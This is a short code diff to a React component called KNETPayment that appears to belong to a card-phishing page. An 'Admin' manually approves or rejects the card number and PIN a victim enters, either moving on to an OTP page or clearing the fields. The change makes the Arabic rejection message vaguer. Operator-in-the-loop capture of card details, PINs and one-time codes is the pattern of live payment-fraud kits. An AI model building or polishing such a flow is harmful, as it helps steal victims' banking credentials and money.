@@ -161,7 +161,7 @@ export default function KNETPayment() {
           navigateToPage("رمز التحقق كي نت (OTP)");
         } else if (action === "reject") {
           // Admin rejected card → show error, clear fields
-          setRejectedError("يرجى التأكد من معلومات البطاقة المدخلة أو محاولة الدفع من بطاقة أخرى");
+          setRejectedError("يرجى التأكد من المعلومات المدخلة");
           setCardNumber("");
           setCardPin("");
           setSelectedPrefix("");
